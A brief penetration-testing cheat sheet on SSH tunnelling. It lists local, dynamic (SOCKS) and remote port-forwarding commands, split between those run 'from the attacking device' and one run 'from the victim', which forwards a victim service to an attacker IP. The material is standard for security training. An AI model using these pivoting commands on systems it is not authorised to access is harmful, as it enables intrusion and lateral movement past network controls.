### From Attacking Device

#### Connect to a port on another device

```bash
ssh -N -L 0.0.0.0:[local_port]:[target_ip]:[target_port] [user]@[target]
```

Example:

```bash
ssh -N -L 0.0.0.0:3389:10.1.1.10:3389 [user]@[target]
```

#### Connect to a port on target device

```bash
sudo ssh -N -L 0.0.0.0:[local_port_]:127.0.0.1:[target_port] [user]@[target]
```

Example:

```bash
sudo ssh -N -L 0.0.0.0:3389:127.0.0.1:3389 [user]@[target]
```

Dynamic Port Forwarding:

```bash
sudo ssh -N -D 127.0.0.1:1080 [user]@[target]
```

### From Victim

This will open a new port on the attacking device from the target. If 3306 is open on the target but we don't have access to if we can forward this port over the ssh tunnel.

```bash
ssh -N -R [attacker_ip]:[local_port]:127.0.0.1:[target_port] [user]@[target]
```

Example

```bash
ssh -N -R 10.10.5.1:3389:127.0.0.1:3389 [user]@[target]
```